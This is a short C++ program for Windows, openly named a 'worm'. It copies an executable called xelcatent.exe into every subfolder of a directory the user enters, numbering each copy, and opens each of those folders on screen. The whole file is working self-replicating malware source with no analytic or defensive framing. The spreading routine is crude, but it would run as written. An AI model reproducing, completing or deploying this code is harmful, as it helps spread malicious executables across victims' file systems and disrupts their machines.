#include <iostream>
#include <fstream>
#include <filesystem>
#include <Windows.h>

void replicant(const std::string& sourceFile, const std::string& destinationFile) {
    std::ifstream source(sourceFile, std::ios::binary);
    std::ofstream destination(destinationFile, std::ios::binary);

    if (source.is_open() && destination.is_open()) {
        destination << source.rdbuf();
        source.close();
        destination.close();
        std::cout << "File copied successfully." << std::endl;
    } else {
        std::cout << "Failed to open files." << std::endl;
    }
}

void worm(const std::string& sourceFilePath, const std::string& destinationFolderPath) {
    std::ifstream source(sourceFilePath);
    if (!source.is_open()) {
        std::cout << "Failed to open the source file." << std::endl;
        return;
    }

    std::filesystem::path destinationPath(destinationFolderPath);
    if (!std::filesystem::exists(destinationPath) || !std::filesystem::is_directory(destinationPath)) {
        std::cout << "Destination folder '" << destinationFolderPath << "' does not exist or is not a directory." << std::endl;
        return;
    }

    int copyNumber = 1;

    for (const auto& entry : std::filesystem::directory_iterator(destinationPath)) {
        if (entry.is_directory()) {
            std::filesystem::path destinationFile = entry.path() / ("xelcatent-" + std::to_string(copyNumber) + std::filesystem::path(sourceFilePath).extension().string());
            std::string destinationFilePath = destinationFile.string();
            replicant(sourceFilePath, destinationFilePath);
            std::wstring widePath = entry.path().wstring();
            ShellExecuteW(NULL, L"open", widePath.c_str(), NULL, NULL, SW_SHOW);
            ++copyNumber;
        }
    }

    source.close();
}

int main() {
    std::string destinationFolderPath;
    std::string sourceFilePath = "./xelcatent.exe";
    std::cout << "Input destination Folder Path:";
    std::cin >> destinationFolderPath;

    worm(sourceFilePath, destinationFolderPath);

    return 0;
}
